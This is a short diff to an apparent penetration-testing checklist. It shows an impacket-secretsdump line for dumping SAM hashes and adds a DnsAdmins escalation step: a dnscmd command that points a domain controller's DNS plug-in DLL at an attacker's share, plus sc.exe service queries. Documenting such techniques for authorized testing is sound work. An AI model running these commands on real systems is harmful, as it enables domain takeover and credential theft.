@@ -31,3 +31,11 @@ impacket-secretsdump -sam sam.save -system system.save LOCAL
 ```
 
 Save original service or file state before any change and restore it afterward.
+
+For a confirmed DnsAdmins path, check whether you can set the DNS server plug-in DLL and restart the service. For Server Operators, check the exact service configuration and restart rights. These group names alone are not enough:
+
+```cmd
+dnscmd <dc> /config /serverlevelplugindll \\<kali-ip>\share\plugin.dll
+sc.exe \\<dc> query dns
+sc.exe qc <service>
+```
